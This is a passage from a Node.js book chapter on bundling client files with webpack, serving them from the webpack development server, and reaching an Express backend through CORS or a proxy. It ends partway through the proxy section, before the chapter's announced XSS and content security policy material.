<html><head></head><body>
<div><h1 class="chapternumber">7</h1>
<h1 class="chaptertitle" id="_idParaDest-134">Using Bundles and Content Security</h1>
<p class="normal1">Modern web development requires three key components: the backend server, the client-side application, and the browser. Earlier chapters have demonstrated how the Node.js API – and its add-on packages – can be used to receive and process HTTP requests. Now it is time to explore how the server-side part of the application has to work together with the other components.</p>
<p class="normal">This chapter covers two topics that shape the way the parts of an application fit together. The first topic is <a id="_idIndexMarker359" class="calibre3"/>using a <strong class="screentext">bundler</strong>. The client-side part of an application usually consists of a large number of files, and these are gathered together and compressed into a small number of files for efficiency. This is done by a bundler and most of the widely used client-side frameworks, such as Angular and React, provide developer tools that use a bundler named webpack. In the first part of the chapter, I explain how webpack works and describe the different ways that it can be integrated with the backend server. <em class="italic">Table 7.1</em> puts bundlers in context.</p>
<p class="packt_figref">Table 7.1: Putting Bundlers in context</p>
<table class="table-container" id="table001-4">
<tbody class="calibre8">
<tr class="calibre9">
<td class="table-cell">
<p class="normal">Question</p>
</td>
<td class="table-cell">
<p class="normal">Answer</p>
</td>
</tr>
<tr class="calibre9">
<td class="table-cell">
<p class="normal">What are they?</p>
</td>
<td class="table-cell">
<p class="normal">Bundlers combine and compress the files required by the client-side part of the application.</p>
</td>
</tr>
<tr class="calibre9">
<td class="table-cell">
<p class="normal">Why are they useful?</p>
</td>
<td class="table-cell">
<p class="normal">Bundlers reduce the number of HTTP requests the browser has to make to get the client-side files and reduce the total amount of data that has to be transferred. </p>
</td>
</tr>
<tr class="calibre9">
<td class="table-cell">
<p class="normal">How are they used?</p>
</td>
<td class="table-cell">
<p class="normal">Bundlers can be used stand-alone or integrated into the server-side build tools.</p>
</td>
</tr>
<tr class="calibre9">
<td class="table-cell">
<p class="normal">Are there any pitfalls or limitations?</p>
</td>
<td class="table-cell">
<p class="normal">Bundlers are often integrated into more complex client-side development tools and cannot always be configured directly, which can limit the options for integration with the backend server.</p>
</td>
</tr>
<tr class="calibre9">
<td class="table-cell">
<p class="normal">Are there any alternatives?</p>
</td>
<td class="table-cell">
<p class="normal">Bundlers are not required, but adoption is usually driven by the choice of build tools for the client-side framework.</p>
</td>
</tr>
</tbody>
</table>
<p class="normal">The second topic in this chapter is the <a id="_idIndexMarker360" class="calibre3"/>use of a <strong class="screentext">content security policy</strong> (<strong class="screentext">CSP</strong>). Browsers are active participants in web applications, and CSPs allow the browser to stop client-side JavaScript code from performing<a id="_idIndexMarker361" class="calibre3"/> unexpected actions. Content security policies are an important defense against<strong class="screentext"> cross-site scripting</strong> (<strong class="screentext">XSS</strong>) attacks, in which an attacker subverts the application to execute JavaScript code.</p>
<p class="normal">In this chapter, I deliberately create an XSS vulnerability in the example application, demonstrate how it can be exploited, and then use a content security browser to provide the browser with the information it needs to stop the application from being abused. <em class="italic">Table 7.2</em> puts content security policies in context.</p>
<p class="packt_figref">Table 7.2: Putting Content security policies in context</p>
<table class="table-container" id="table002-4">
<tbody class="calibre8">
<tr class="calibre9">
<td class="table-cell">
<p class="normal">Question</p>
</td>
<td class="table-cell">
<p class="normal">Answer</p>
</td>
</tr>
<tr class="calibre9">
<td class="table-cell">
<p class="normal">What are they?</p>
</td>
<td class="table-cell">
<p class="normal">Content security policies describe the expected behavior of the client-side code to the browser. </p>
</td>
</tr>
<tr class="calibre9">
<td class="table-cell">
<p class="normal">Why are they useful?</p>
</td>
<td class="table-cell">
<p class="normal">Browsers stop JavaScript code from performing actions that deviate from those defined by the content security policy.</p>
</td>
</tr>
<tr class="calibre9">
<td class="table-cell">
<p class="normal">How are they used?</p>
</td>
<td class="table-cell">
<p class="normal">The backend server includes a <code class="inlinecode">Content-Security-Policy</code> header in HTTP responses. The header specifies directives that describe the expected behavior of the client-side code. </p>
</td>
</tr>
<tr class="calibre9">
<td class="table-cell">
<p class="normal">Are there any pitfalls or limitations?</p>
</td>
<td class="table-cell">
<p class="normal">It can require careful testing to define a content security policy that allows the client-side code to function without creating opportunities for XSS attacks. For this reason, content security policies must be used alongside other measures, such as input sanitization, as described in <em class="italic">Part 2</em> of this book.</p>
</td>
</tr>
<tr class="calibre9">
<td class="table-cell">
<p class="normal">Are there any alternatives?</p>
</td>
<td class="table-cell">
<p class="normal">Content security policies are optional but provide an important defense against subversion of the client-side part of the application and should be used whenever possible. </p>
</td>
</tr>
</tbody>
</table>
<p class="normal"><em class="italic">Table 7.3</em> summarizes the chapter.</p>
<p class="packt_figref">Table 7.3: Chapter Summary</p>
<table class="table-container" id="table003-4">
<tbody class="calibre8">
<tr class="calibre9">
<td class="table-cell">
<p class="normal">Problem</p>
</td>
<td class="table-cell">
<p class="normal">Solution</p>
</td>
<td class="table-cell">
<p class="normal">Listing</p>
</td>
</tr>
<tr class="calibre9">
<td class="table-cell">
<p class="normal">Combine client-side files to minimize HTTP requests </p>
</td>
<td class="table-cell">
<p class="normal">Use a JavaScript bundler such as webpack.</p>
</td>
<td class="table-cell">
<p class="normal"><em class="italic1">6-10</em></p>
</td>
</tr>
<tr class="calibre9">
<td class="table-cell">
<p class="normal">Reload the browser automatically when a new bundle is created</p>
</td>
<td class="table-cell">
<p class="normal">Use the webpack development HTTP server.</p>
</td>
<td class="table-cell">
<p class="normal"><em class="italic1">11-14</em></p>
</td>
</tr>
<tr class="calibre9">
<td class="table-cell">
<p class="normal">Receive backend server requests from bundled client-side code</p>
</td>
<td class="table-cell">
<p class="normal">Use a separate URL and enable CORS on the backend server, or proxy requests between the two servers.</p>
</td>
<td class="table-cell">
<p class="normal"><em class="italic1">15-22</em></p>
</td>
</tr>
<tr class="calibre9">
<td class="table-cell">
<p class="normal">Defend against cross-site scripting attacks</p>
</td>
<td class="table-cell">
<p class="normal">Define and apply a content security policy.</p>
</td>
<td class="table-cell">
<p class="normal"><em class="italic1">23-33</em></p>
</td>
</tr>
<tr class="calibre9">
<td class="table-cell">
<p class="normal">Simplify the process of defining a content security policy</p>
</td>
<td class="table-cell">
<p class="normal">Use a JavaScript package such as Helmet.</p>
</td>
<td class="table-cell">
<p class="normal"><em class="italic1">34-36</em></p>
</td>
</tr>
</tbody>
</table>
<h1 class="heading" id="_idParaDest-135">Preparing for this chapter</h1>
<p class="normal1">In this chapter, I continue using the <code class="inlinecode">webapp</code> project from <em class="italic">Chapter 6</em>. To prepare for this chapter, replace the contents of the <code class="inlinecode">readHandler.ts</code> file with the code shown in <em class="italic">Listing 7.1</em>.</p>
<div><p class="normal"><strong class="screentext">Tip</strong></p>
<p class="normal">You can download the example project for this chapter – and for all the other chapters in this book – from <a href="https://github.com/PacktPublishing/Mastering-Node.js-Web-Development" class="calibre3">https://github.com/PacktPublishing/Mastering-Node.js-Web-Development</a>. See <em class="italic">Chapter 1</em> for how to get help if you have problems running the examples.</p>
</div>
<p class="packt_figref">Listing 7.1: The contents of the readHandler.ts file in the src folder</p>
<pre class="programlisting"><code class="hljs-code">import { Request, Response } from "express";
export const readHandler = (req: Request, resp: Response) =&gt; {   
    resp.json({
        message: "Hello, World"
    });
}
</code></pre>
<p class="normal">This handler replies to all messages with a response that contains a JSON-formatted object. Replace the contents of the <code class="inlinecode">server.ts</code> file in the <code class="inlinecode">src</code> folder with the code shown in <em class="italic">Listing 7.2</em>.</p>
<p class="packt_figref">Listing 7.2: The contents of the server.ts file in the src folder</p>
<pre class="programlisting"><code class="hljs-code">import { createServer } from "http";
import express, {Express } from "express";
import { readHandler } from "./readHandler";
const port = 5000;
const expressApp: Express = express();
expressApp.use(express.json());
expressApp.post("/read", readHandler);
expressApp.use(express.static("static"));
expressApp.use(express.static("node_modules/bootstrap/dist"));
const server = createServer(expressApp);
server.listen(port,
    () =&gt; console.log(`HTTP Server listening on port ${port}`));
</code></pre>
<p class="normal">This code removes some of the handlers used in the previous examples and uses Express to serve static content and match POST requests to the <code class="inlinecode">/read</code> path to the handler defined in <em class="italic">Listing 7.1</em>.</p>
<p class="normal">Next, replace the contents of the <code class="inlinecode">index.html</code> file in the <code class="inlinecode">static</code> folder with the elements shown in <em class="italic">Listing 7.3</em>, which removes the image used in the previous chapter and applies styles provided by the Bootstrap CSS package to a table that displays the responses from the server.</p>
<p class="packt_figref">Listing 7.3: The contents of the index.html file in the static folder</p>
<pre class="programlisting"><code class="hljs-code">&lt;!DOCTYPE html&gt;
&lt;html&gt;
    &lt;head&gt;
        &lt;script src="img/client.js"&gt;&lt;/script&gt;
        &lt;link href="css/bootstrap.min.css" rel="stylesheet" /&gt;
    &lt;/head&gt;
    &lt;body&gt;
       &lt;button id="btn" class="btn btn-primary m-2"&gt;Send Request&lt;/button&gt;
       &lt;table class="table table-striped"&gt;
            &lt;tbody&gt;
                &lt;tr&gt;&lt;th&gt;Status&lt;/th&gt;&lt;td id="msg"&gt;&lt;/td&gt;&lt;/tr&gt;
                &lt;tr&gt;&lt;th&gt;Response&lt;/th&gt;&lt;td id="body"&gt;&lt;/td&gt;&lt;/tr&gt;
            &lt;/tbody&gt;
       &lt;/table&gt;
    &lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p class="normal">Run the command shown in <em class="italic">Listing 7.4</em> in the <code class="inlinecode">webapp</code> folder to start the watcher that compiles TypeScript files and executes the JavaScript that is produced.</p>
<p class="packt_figref">Listing 7.4: Starting the project</p>
<pre class="programlisting1"><code class="hljs-con">npm start
</code></pre>
<p class="normal">Open a web browser and request <code class="inlinecode">http://localhost:5000</code>. Click the <strong class="screentext">Send Request</strong> button and you will see the result shown in <em class="italic">Figure 7.1</em>.</p>
<figure class="mediaobject"><img alt="" src="img/B21959_07_01.png" class="calibre7"/></figure>
<p class="packt_figref">Figure 7.1: Running the example project</p>
<h1 class="heading" id="_idParaDest-136">Packaging client files</h1>
<p class="normal1">The client side of <a id="_idIndexMarker362" class="calibre3"/>web applications is usually executed by a browser, and the application is delivered as an HTML file that, in turn, tells the browser to request JavaScript files, CSS stylesheets, and any other resources that are required.</p>
<p class="normal">There can be many JavaScript and CSS files, which means the browser has to make HTTP requests for many files. Those files tend to be verbose because they are formatted to be read and maintained by the development team, with whitespace and comments that are not required to run the application.</p>
<p class="normal">Many projects use a bundler, which processes client-side assets to make them smaller and combine them into fewer files. The most popular bundler is webpack (<a href="https://webpack.js.org" class="calibre3">https://webpack.js.org</a>), which<a id="_idIndexMarker363" class="calibre3"/> can be used on its own or as part of the standard developer tools for frameworks such as React and Angular. There are other bundlers available, just as with most areas of JavaScript functionality, but webpack is a good place to start because of its popularity and longevity.</p>
<p class="normal">Bundlers can help the server side of the project by concentrating the requests clients make <a id="_idIndexMarker364" class="calibre3"/>for resources into fewer requests and smaller files. However, bundlers often need work to integrate them with the project so that client-side and server-side development can be easily combined. </p>
<p class="normal">In the sections <a id="_idIndexMarker365" class="calibre3"/>that follow, I describe the different ways bundles can be used and explain the impact each of them has on server-side development. Run the command shown in <em class="italic">Listing 7.5</em> in the <code class="inlinecode">webapp</code> folder to install the <code class="inlinecode">webpack</code> packages. This command also installs the <code class="inlinecode">npm-run-all</code> package, which allows multiple NPM scripts to be run concurrently.</p>
<p class="packt_figref">Listing 7.5: Installing the bundler packages</p>
<pre class="programlisting1"><code class="hljs-con">npm install --save-dev webpack@5.89.0
npm install --save-dev webpack-cli@5.1.4
npm install --save-dev npm-run-all@4.1.5
</code></pre>
<h2 class="heading1" id="_idParaDest-137">Creating stand-alone bundles</h2>
<p class="normal1">The <a id="_idIndexMarker366" class="calibre3"/>simplest way to use a bundler is as a stand-alone tool. To configure <code class="inlinecode">webpack</code>, add a file named <code class="inlinecode">webpack.config.mjs</code> to the <code class="inlinecode">webapp</code> folder with the content shown in <em class="italic">Listing 7.6</em>. webpack uses a JavaScript – rather than JSON – configuration file and the <code class="inlinecode">mjs</code> file extension specifies a JavaScript module, which allows the use of the same <code class="inlinecode">import</code> syntax used throughout this book. </p>
<p class="packt_figref">Listing 7.6: The contents of the webpack.config.mjs file in the webapp folder</p>
<pre class="programlisting"><code class="hljs-code">import path from "path";
import { fileURLToPath } from 'url';
const __dirname = path.dirname(fileURLToPath(import.meta.url));
export default  {
    mode: "development",
    entry: "./static/client.js",
    output: {
        path: path.resolve(__dirname, "dist/client"),
        filename: "bundle.js"
    }
};
</code></pre>
<p class="normal">This basic configuration file tells <code class="inlinecode">webpack</code> to process the <code class="inlinecode">client.js</code> file in the <code class="inlinecode">static</code> folder and write the bundle it creates to a file named <code class="inlinecode">bundle.js</code> in the <code class="inlinecode">dist/client</code> folder. There<a id="_idIndexMarker367" class="calibre3"/> isn’t enough client-side JavaScript in the example project to give webpack much to do, but in a real project, webpack will follow all the imports made in the starting JavaScript file and incorporate all of the code the application requires into the bundle. <em class="italic">Listing 7.7</em> updates the <code class="inlinecode">index.html</code> file so that it uses the <code class="inlinecode">bundle.js</code> file that webpack will create.</p>
<p class="packt_figref">Listing 7.7: Using the bundle file in the index.html file in the static folder</p>
<pre class="programlisting"><code class="hljs-code">&lt;!DOCTYPE html&gt;
&lt;html&gt;
    &lt;head&gt;
        <strong class="screentext">&lt;script src="img/bundle.js"&gt;&lt;/script&gt;</strong>
        &lt;link href="css/bootstrap.min.css" rel="stylesheet" /&gt;
    &lt;/head&gt;
    &lt;body&gt;
       &lt;button id="btn" class="btn btn-primary m-2"&gt;Send Request&lt;/button&gt;
       &lt;table class="table table-striped"&gt;
            &lt;tbody&gt;
                &lt;tr&gt;&lt;th&gt;Status&lt;/th&gt;&lt;td id="msg"&gt;&lt;/td&gt;&lt;/tr&gt;
                &lt;tr&gt;&lt;th&gt;Response&lt;/th&gt;&lt;td id="body"&gt;&lt;/td&gt;&lt;/tr&gt;
            &lt;/tbody&gt;
       &lt;/table&gt;
    &lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p class="normal">To allow the client to request the <code class="inlinecode">bundle.js</code> file, <em class="italic">Listing 7.8</em> uses the Express static files middleware to add a new location for file requests.</p>
<p class="packt_figref">Listing 7.8: Adding a file location in the server.ts file in the src folder</p>
<pre class="programlisting"><code class="hljs-code">...
expressApp.post("/read", readHandler);
expressApp.use(express.static("static"));
expressApp.use(express.static("node_modules/bootstrap/dist"));
<strong class="screentext">expressApp.use(express.static("</strong><strong class="screentext">dist/client"));</strong>
...
</code></pre>
<p class="normal">The final step is <a id="_idIndexMarker368" class="calibre3"/>to update the <code class="inlinecode">scripts</code> section of the <code class="inlinecode">package.json</code> file so that webpack is run in watch mode alongside the existing build process for the server-side JavaScript file, as shown in <em class="italic">Listing 7.9</em>. </p>
<p class="packt_figref">Listing 7.9: Updating scripts in the package.json file in the webapp folder</p>
<pre class="programlisting"><code class="hljs-code">...
"scripts": {
<strong class="screentext">    "server": "tsc-watch --onsuccess \"node dist/server.js\"",</strong>
<strong class="screentext">    "client"</strong><strong class="screentext">: "webpack --watch",</strong>
<strong class="screentext">    "start": "npm-run-all --parallel server client"</strong>
},
...
</code></pre>
<p class="normal">The new <code class="inlinecode">start</code> command uses the <code class="inlinecode">npm-run-all</code> package to start <code class="inlinecode">client</code> and <code class="inlinecode">server</code> commands that run the webpack client-side bundler and the server-side TypeScript compiler side by side. Putting webpack into watch mode means the bundle will be updated automatically when the client-side JavaScript file is altered.</p>
<p class="normal">Stop the existing Node.js server and run the <code class="inlinecode">npm</code> <code class="inlinecode">start</code> command in the <code class="inlinecode">webapp</code> folder. <em class="italic">Listing 7.10</em> makes a small change to the client-side code that will demonstrate webpack change detection.</p>
<p class="packt_figref">Listing 7.10: Making a small change in the client.js file in the static folder</p>
<pre class="programlisting"><code class="hljs-code">document.addEventListener('DOMContentLoaded', function() {
    document.getElementById("btn").addEventListener("click", sendReq);
});
sendReq = async () =&gt; {
    let payload = [];
    for (let i = 0; i &lt; 5; i++) {
        payload.push({ id: i, message: `Payload Message: ${i}\n`});
    }
    const response = await fetch("/read", {
        method: "POST", body: JSON.stringify(payload),
        headers: {
            "Content-Type": "application/json"
        }
    })
    document.getElementById("msg").textContent = response.statusText;
  <strong class="screentext"> </strong><strong class="screentext">document.getElementById("body").textContent</strong>
<strong class="screentext">        = `Resp: ${await response.text()}`;</strong>
}
</code></pre>
<p class="normal">When<a id="_idIndexMarker369" class="calibre3"/> the <code class="inlinecode">client.js</code> file is saved, the change will be detected by webpack, which will create a new bundle file, producing console messages like these:</p>
<pre class="programlisting1"><code class="hljs-con">assets by status 1.86 KiB [cached] 1 asset
./static/client.js 631 bytes [built]
webpack 5.89.0 compiled successfully in 13 ms
</code></pre>
<p class="normal">Reload the browser – or open a new browser and request <code class="inlinecode">http://localhost:5000</code> – and click the Send Request button and you will see the effect of the change when the response is displayed, as shown in <em class="italic">Figure 7.2</em>.</p>
<figure class="mediaobject"><img alt="" src="img/B21959_07_02.png" class="calibre7"/></figure>
<p class="packt_figref">Figure 7.2: Using a client-side bundler</p>
<h2 class="heading1" id="_idParaDest-138">Using the webpack development server</h2>
<p class="normal1">webpack provides <a id="_idIndexMarker370" class="calibre3"/>an HTTP server that streamlines the client-side development process, and this is widely used as the basis for popular development packages for Angular, React, and other popular frameworks. If the client-side part of your project relies on one of these frameworks, then you are likely to find yourself working with the webpack development server.</p>
<p class="normal">The webpack development server can be used for client-side development alongside the conventional server-side functionality, albeit with some integration. Run the command shown in <em class="italic">Listing 7.11</em> in the <code class="inlinecode">webapp</code> folder to install the webpack development HTTP server. </p>
<p class="packt_figref">Listing 7.11: Adding the development server package</p>
<pre class="programlisting1"><code class="hljs-con">npm install --save-dev webpack-dev-server@4.15.1
</code></pre>
<p class="normal">The webpack development web server has a lot of configuration options, which are described in detail at <a href="https://webpack.js.org/configuration/dev-server" class="calibre3">https://webpack.js.org/configuration/dev-server</a>, but the default settings are well-chosen and suit most projects. <em class="italic">Listing 7.12</em> adds a section to the webpack configuration file for the development server.</p>
<p class="packt_figref">Listing 7.12: Adding a section in the webpack.config.mjs file in the webapp folder</p>
<pre class="programlisting"><code class="hljs-code">import path from "path";
import { fileURLToPath } from 'url';
const __dirname = path.dirname(fileURLToPath(import.meta.url));
export default  {
    mode: "development",
    entry: "./static/client.js",
    output: {
        path: path.resolve(__dirname, "dist/client"),
        filename: "bundle.js"
<strong class="screentext">    },</strong>
<strong class="screentext">    "devServer": {</strong>
<strong class="screentext">        port: 5100,</strong>
<strong class="screentext">        static: ["./static", "node_modules/bootstrap/dist"]</strong>
<strong class="screentext">    }</strong>
};
</code></pre>
<p class="normal">The <code class="inlinecode">devServer</code> configuration section contains the settings for the HTTP server. The webpack server listens for HTTP requests on the port specified by the <code class="inlinecode">port</code> setting and responds using the files in the directories specified by the <code class="inlinecode">static</code> setting. The <a id="_idIndexMarker371" class="calibre3"/>key difference is that the bundle of JavaScript sent to the browser contains additional code that opens a persistent HTTP connection back to the development server and waits for a signal. When webpack detects that one of the files it is watching has changed, it builds a new bundle and sends the browser the signal that it has been waiting for, which loads the changed content dynamically. This is known as <em class="italic">live reloading</em>. </p>
<div><p class="normal"><strong class="screentext">Tip</strong></p>
<p class="normal">There is a more sophisticated option available, known as <em class="italic">hot module replacement</em>, that will attempt to update individual JavaScript modules without affecting the rest of the code or forcing the browser to reload. See <a href="https://webpack.js.org/guides/hot-module-replacement" class="calibre3">https://webpack.js.org/guides/hot-module-replacement</a> for details. </p>
</div>
<p class="normal"><em class="italic">Listing 7.13</em> changes the script used to use the webpack development HTTP server instead of watch mode. (The addition of the <code class="inlinecode">noClear</code> argument to the <code class="inlinecode">tsc-watch</code> command stops the output from the webpack development server from being lost when the server-side code is compiled).</p>
<p class="packt_figref">Listing 7.13: Updating the webpack script in the package.json file in the webapp folder</p>
<pre class="programlisting"><code class="hljs-code">...
"scripts": {
   <strong class="screentext"> "server": "tsc-watch --noClear --onsuccess \"node dist/server.js\"",</strong>
<strong class="screentext">    "client": "webpack serve",</strong>
    "start": "npm-run-all --parallel server client"
},
...
</code></pre>
<p class="normal">Stop the node processes from the previous section and run <code class="inlinecode">npm</code> <code class="inlinecode">start</code> in the <code class="inlinecode">webapp</code> folder so that the new configuration takes effect.</p>
<p class="normal">You can <a id="_idIndexMarker372" class="calibre3"/>see the effect of the webpack development server by using the browser to request <code class="inlinecode">http://localhost:5100</code> (note the new port number) and using your code editor to make a change to the <code class="inlinecode">index.html</code> file, as shown in <em class="italic">Listing 7.14</em>.</p>
<p class="packt_figref">Listing 7.14: Changing an element in the index.html file in the static folder</p>
<pre class="programlisting"><code class="hljs-code">&lt;!DOCTYPE html&gt;
&lt;html&gt;
    &lt;head&gt;
        &lt;script src="img/bundle.js"&gt;&lt;/script&gt;
        &lt;link href="css/bootstrap.min.css" rel="stylesheet" /&gt;
    &lt;/head&gt;
    &lt;body&gt;
       <strong class="screentext">&lt;button id="</strong><strong class="screentext">btn" class="btn btn-primary m-2"&gt;Send Message&lt;/button&gt;</strong>
       &lt;table class="table table-striped"&gt;
            &lt;tbody&gt;
                &lt;tr&gt;&lt;th&gt;Status&lt;/th&gt;&lt;td id="msg"&gt;&lt;/td&gt;&lt;/tr&gt;
                &lt;tr&gt;&lt;th&gt;Response&lt;/th&gt;&lt;td id="body"&gt;&lt;/td&gt;&lt;/tr&gt;
            &lt;/tbody&gt;
       &lt;/table&gt;
    &lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p class="normal">This file isn’t part of the bundle, but webpack watches files in the <code class="inlinecode">static</code> locations in its configuration file and will trigger an update if they change. When you save the file, the browser will automatically reload and the new text on the button will be displayed, as shown in <em class="italic">Figure 7.3</em>.</p>
<figure class="mediaobject"><img alt="" src="img/B21959_07_03.png" class="calibre7"/></figure>
<p class="packt_figref">Figure 7.3: An automatic update from the webpack development server</p>
<p class="normal">Introducing <a id="_idIndexMarker373" class="calibre3"/>a server just to serve the client-side code causes problems because the webpack server has no means to respond to HTTP requests made by the client-side JavaScript code it bundles. You can see the problem by clicking on the <strong class="screentext">Send Message</strong> button. The request will fail, and the detail of the response generated by the webpack server is displayed, as shown in <em class="italic">Figure 7.4</em>.</p>
<figure class="mediaobject"><img alt="" src="img/B21959_07_04.png" class="calibre7"/></figure>
<p class="packt_figref">Figure 7.4: Sending an HTTP request</p>
<p class="normal">In the sections that follow, I describe three different ways this problem can be solved. Not all approaches work in every project because client-side frameworks don’t always<a id="_idIndexMarker374" class="calibre3"/> allow the underlying webpack configuration to be changed or they introduce specific requirements for how requests are processed. But all frameworks can be used with at least one of these approaches and it is worth experimenting to find one that works and that suits your development style.</p>
<h3 class="heading2" id="_idParaDest-139">Using a different request URL</h3>
<p class="normal1">The simplest<a id="_idIndexMarker375" class="calibre3"/> approach is to change the URL to which the client-side JavaScript code sends requests, as shown in <em class="italic">Listing 7.15</em>. This is a useful approach when you cannot make changes to the webpack configuration file, typically because it is hidden deep inside a framework-specific build tool. </p>
<p class="packt_figref">Listing 7.15: Changing URL in the client.js file in the static folder</p>
<pre class="programlisting"><code class="hljs-code">document.addEventListener('DOMContentLoaded', function() {
    document.getElementById("btn").addEventListener("click", sendReq);
});
<strong class="screentext">const requestUrl = "http://localhost:5000/read";</strong>
sendReq = async () =&gt; {
    let payload = [];
    for (let i = 0; i &lt; 5; i++) {
        payload.push({ id: i, message: `Payload Message: ${i}\n`});
    }
 <strong class="screentext">   const response = await fetch(requestUrl, {</strong>
        method: "POST", body: JSON.stringify(payload),
        headers: {
            "Content-Type": "application/json"
        }
    })
    document.getElementById("msg").textContent = response.statusText;
    document.getElementById("body").textContent
        = `Resp: ${await response.text()}`;
}
</code></pre>
<p class="normal">This approach<a id="_idIndexMarker376" class="calibre3"/> is simple and effective, but it does require changes to the server-side part of the application. Browsers allow JavaScript code to make HTTP requests only within the same <em class="italic">origin</em>, which means URLs that have the same scheme, host, and port as the URL used to load the JavaScript code. The change in <em class="italic">Listing 7.15</em> means that the HTTP request is to a URL that is outside of the allowed origin and so the browser blocks the request. The solution to this problem is to use <strong class="screentext">Cross-Origin Resource Sharing</strong> (<strong class="screentext">CORS</strong>), in which the browser sends an additional request to the target HTTP server to determine whether it is willing to accept HTTP requests from the origin of the JavaScript code. </p>
<p class="normal">Save the changes in <em class="italic">Listing 7.15</em>, open the browser’s F12 developer tools, and click the <strong class="screentext">Send Message</strong> button in the browser window. Ignore the message displayed in the main browser window and use the <strong class="screentext">Network</strong> tab of the F12 tools to see the requests the browser has made. You will see a request that uses the HTTP <code class="inlinecode">OPTIONS</code> method, which is known as the <em class="italic">pre-flight request</em>, as shown in <em class="italic">Figure 7.5</em>, and which allows the backend server to indicate whether it will accept the request.</p>
<figure class="mediaobject"><img alt="" src="img/B21959_07_05.png" class="calibre7"/></figure>
<p class="packt_figref">Figure 7.5: The preflight request</p>
<p class="normal">The response<a id="_idIndexMarker377" class="calibre3"/> from the backend server did not include the <code class="inlinecode">Access-Control-Allow-Origin</code> header, which would have indicated that cross-origin requests are allowed, and so the browser blocks the POST request.</p>
<p class="normal">CORS is described in <a id="_idIndexMarker378" class="calibre3"/>detail at <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS" class="calibre3">https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS</a>, and you can use the Node.js API described in <em class="italic">Chapter 5</em> to set the headers required to allow client requests. A simpler approach is to use one of the many JavaScript packages available to manage<a id="_idIndexMarker379" class="calibre3"/> CORS. Run the command shown in <em class="italic">Listing 7.16</em> in the <code class="inlinecode">webapp</code> folder to install a CORS package for Express and a package that describes the API it provides for the TypeScript compiler.</p>
<p class="packt_figref">Listing 7.16: Installing the CORS package and type descriptions</p>
<pre class="programlisting1"><code class="hljs-con">npm install cors@2.8.5
npm install --save-dev @types/cors@2.8.16
</code></pre>
<p class="normal"><em class="italic">Listing 7.17</em> configures Express to use the new package to allow cross-origin requests.</p>
<p class="packt_figref">Listing 7.17. Allowing cross-origin requests in the server.Ts file in the src folder</p>
<pre class="programlisting"><code class="hljs-code">import { createServer } from "http";
import express, {Express } from "express";
import { readHandler } from "./readHandler";
<strong class="screentext">import cors from "cors";</strong>
const port = 5000;
const expressApp: Express = express();
<strong class="screentext">expressApp.use(cors({</strong>
<strong class="screentext">    origin: "http://localhost:5100"</strong>
<strong class="screentext">}));</strong>
expressApp.use(express.json());
expressApp.post("/read", readHandler);
expressApp.use(express.static("static"));
expressApp.use(express.static("node_modules/bootstrap/dist"));
expressApp.use(express.static("dist/client"));
const server = createServer(expressApp);
server.listen(port,
    () =&gt; console.log(`HTTP Server listening on port ${port}`));
</code></pre>
<p class="normal">The <a id="_idIndexMarker380" class="calibre3"/>CORS package contains an Express middleware package that is applied with the <code class="inlinecode">use</code> method. The full set of CORS configuration options can be found at <a href="https://github.com/expressjs/cors" class="calibre3">https://github.com/expressjs/cors</a> and <em class="italic">Listing 7.17</em> uses the <code class="inlinecode">origin</code> configuration setting to specify that requests are allowed from <code class="inlinecode">http://localhost:5100</code>, which will allow requests from JavaScript code loaded from the webpack development server.</p>
<p class="normal">Dismiss the error message displayed in the browser window (you can click the cross icon or reload the browser) and click the <code class="inlinecode">Send Message</code> button again. This time, the backend server will respond to the OPTIONS request with the headers the browser is expecting, and the HTTP POST request will be allowed. The <em class="italic">F12</em> tools will <a id="_idIndexMarker381" class="calibre3"/>display details of the successful request, as shown in <em class="italic">Figure 7.6</em>.</p>
<figure class="mediaobject"><img alt="" src="img/B21959_07_06.png" class="calibre7"/></figure>
<p class="packt_figref">Figure 7.6: Using CORS to allow cross-origin requests</p>
<h3 class="heading2" id="_idParaDest-140">Forwarding requests from webpack to the backend server</h3>
<p class="normal1">A more<a id="_idIndexMarker382" class="calibre3"/> sophisticated solution is to configure the webpack development server so that it forwards requests to the backend server. The request forwarding isn’t apparent to the browser, which means that all requests are sent to the same origin and CORS isn’t required. <em class="italic">Listing 7.18</em> updates the webpack configuration file to add support for forwarding requests. <a id="_idIndexMarker383" class="calibre3"/></p>
<p class="packt_figref">Listing 7.18: Adding a setting in the webpack.config.mjs file in the webapp folder</p>
<pre class="programlisting"><code class="hljs-code">import path from "path";
import { fileURLToPath } from 'url';
const __dirname = path.dirname(fileURLToPath(import.meta.url));
export default  {
    mode: "development",
    entry: "./static/client.js",
    output: {
        path: path.resolve(__dirname, "dist/client"),
        filename: "bundle.js"
    },
    "devServer": {
        port: 5100,
        static: ["./static", "node_modules/bootstrap/dist"],
        <strong class="screentext">proxy: {</strong>
<strong class="screentext">            "/read": "http://localhost:5000"</strong>
<strong class="screentext">        }</strong>
    }
};
</code></pre>
<p class="normal">The <code class="inlinecode">proxy</code> setting<a id="_idIndexMarker384" class="calibre3"/> is used to specify one or more paths and the URLs to which they should be forwarded. <em class="italic">Listing 7.19</em> updates the client-side JavaScript code so that requests are sent relative to the JavaScript file’s origin.</p>
<p class="packt_figref">Listing 7.19: Using relative URLs in the client.js file in the static folder</p>
<pre class="programlisting"><code class="hljs-code">document.addEventListener('DOMContentLoaded', function() {
    document.getElementById("btn").addEventListener("click", sendReq);
});
<strong class="screentext">const requestUrl = "/read";</strong>
sendReq = async () =&gt; {
    let payload = [];
    for (let i = 0; i &lt; 5; i++) {
        payload.push({ id: i, message: `Payload Message: ${i}\n`});
    }
    const response = await fetch(requestUrl, {
        method: "POST", body: JSON.stringify(payload),
        headers: {
            "Content-Type": "application/json"
        }
    })
    document.getElementById("msg").textContent = response.statusText;
    document.getElementById("body").textContent
        = `Resp: ${await response.text()}`;
}
</code></pre>
<p class="normal">webpack <a id="_idIndexMarker385" class="calibre3"/>doesn’t pick up changes to its configuration file automatically. Use <em class="italic">Control+C</em> to stop the existing process and then run the <code class="inlinecode">npm start</code> command in the <code class="inlinecode">webapp</code> folder to start <code class="inlinecode">webpack</code> and the backend server again. Use a browser to request <code class="inlinecode">http://localhost:5100</code> (the URL for the webpack server) and then click the <strong class="screentext">Send Message</strong> button. The webpack server will receive the request and act as a proxy to get a response from the backend server, producing the response shown in <em class="italic">Figure 7.7</em>.</p>
